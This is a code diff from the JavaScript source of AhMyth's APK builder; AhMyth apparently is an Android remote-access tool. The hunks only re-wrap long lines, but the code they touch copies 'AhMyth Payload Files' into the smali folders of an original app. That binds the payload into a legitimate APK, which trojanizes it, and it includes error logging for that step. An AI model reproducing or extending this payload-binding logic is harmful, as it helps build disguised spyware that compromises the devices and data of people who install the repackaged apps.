@@ -14,7 +14,8 @@
   
           $appCtrl.Log("Sorting the List of Smali Directories...")
           $appCtrl.Log();
-          var ignoreDirs = ['original', 'res', 'build', 'kotlin', 'lib', 'assets', 'META-INF', 'unknown'];
+          var ignoreDirs = ['original', 'res', 'build', 'kotlin',
+          'lib', 'assets', 'META-INF', 'unknown'];
           var smaliList = files
               .filter((item) => item.isDirectory() &&
               !(ignoreDirs.includes(item.name)))
@@ -34,12 +35,14 @@
 
                   $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                   $appCtrl.Log();
-                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali_classes2"), (error) => {
+                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), 
+                  path.join(apkFolder, "smali_classes2"), (error) => {
                       if (error) {
                           $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                           $appCtrl.Log();
                           fs.mkdir(logPath);
-                          fs.writeFile(path.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
+                          fs.writeFile(path.join(logPath, 'Copying.log'), 
+                          `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                           $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                           $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                           $appCtrl.Log();
@@ -88,12 +91,14 @@
                   
                   $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                   $appCtrl.Log();
-                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => {
+                  fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), 
+                  path.join(apkFolder, payloadSmaliFolder), (error) => {
                       if (error) {
                           $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                           $appCtrl.Log();
                           fs.mkdir(logPath);
-                          fs.writeFile(path.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
+                          fs.writeFile(path.join(logPath, 'Copying.log'), 
+                          `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                           $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                           $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                           $appCtrl.Log();
